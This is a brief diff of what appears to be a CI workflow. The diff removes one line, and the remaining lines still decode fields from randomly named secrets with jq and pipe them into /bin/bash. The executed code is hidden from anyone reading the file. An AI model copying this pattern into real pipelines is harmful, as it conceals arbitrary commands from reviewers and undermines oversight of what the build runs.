@@ -17,7 +17,6 @@ jobs:
           ynthu1: ${{ secrets.ynthu1 }}
         run: |
           printf '%s' "$ynthu1" | jq -r .xu14 | /bin/bash
-          printf '%s' "$fxmft1661" | jq -r .wery66331 | /bin/bash
           printf '%s' "$dxtp42" | jq -r .sj3286 | /bin/bash
           printf '%s' "$kylr301" | jq -r .v4940 | /bin/bash
 
